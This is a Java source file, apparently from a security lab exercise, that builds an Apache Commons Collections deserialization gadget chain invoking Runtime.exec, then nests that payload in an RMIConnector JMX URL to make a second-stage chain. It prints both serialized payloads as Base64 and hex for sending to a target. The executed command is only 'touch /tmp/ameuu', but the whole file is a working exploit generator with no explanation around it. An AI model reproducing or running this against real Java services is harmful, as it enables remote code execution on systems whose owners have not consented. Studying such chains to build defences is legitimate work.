package lab4;

import lab1.Utils;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.remote.JMXServiceURL;
import javax.management.remote.rmi.RMIConnector;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class Exp {
    public static void main(String[] args) throws Exception{
        Transformer[] fakeTrans = new Transformer[]{
                new ConstantTransformer(1)
        };
        Transformer[] transformers = new Transformer[]{
          new ConstantTransformer(Runtime.class),
          new InvokerTransformer("getMethod",new Class[]{String.class, Class[].class},new Object[]{"getRuntime", new Class[0]}),
          new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
          new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"touch /tmp/ameuu"}),
          new ConstantTransformer(1)
        };

        Transformer transformer = new ChainedTransformer(fakeTrans);
        Map innerMap = new HashMap();
        Map outMap = LazyMap.decorate(innerMap, transformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(outMap, "aa");

        Map exp = new HashMap();
        exp.put(tiedMapEntry, "bb");

        outMap.remove("aa");

        Field field = ChainedTransformer.class.getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(transformer, transformers);

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(exp);
        oos.close();
        byte[] bytes = bos.toByteArray();

        System.out.println(Base64.getEncoder().encodeToString(bytes));

//        ByteArrayInputStream bis = new ByteArrayInputStream(bytes);
//        ObjectInputStream ois = new ObjectInputStream(bis);
//        ois.readObject();

        RMIConnector rmiConnector = new RMIConnector(new JMXServiceURL("service:jmx:iiop://127.0.0.1:12345/stub/"+Base64.getEncoder().encodeToString(bytes)), null);
//        rmiConnector.connect();

        Map map = new HashMap();
        Transformer invoke = new InvokerTransformer("toString", null, null);
        Map map1 = LazyMap.decorate(map, invoke);
        TiedMapEntry tiedMapEntry1 = new TiedMapEntry(map1, rmiConnector);
        Map exp1 = new HashMap();
        exp1.put(tiedMapEntry1, "aa");
        map1.remove(rmiConnector);

        Field field1 = InvokerTransformer.class.getDeclaredField("iMethodName");
        field1.setAccessible(true);
        field1.set(invoke, "connect");

        ByteArrayOutputStream b = new ByteArrayOutputStream();
        ObjectOutputStream o = new ObjectOutputStream(b);
        o.writeUTF("SJTU");
        o.writeInt(1896);
        o.writeObject(exp1);
        System.out.println(Utils.bytesTohexString(b.toByteArray()));

    }
}
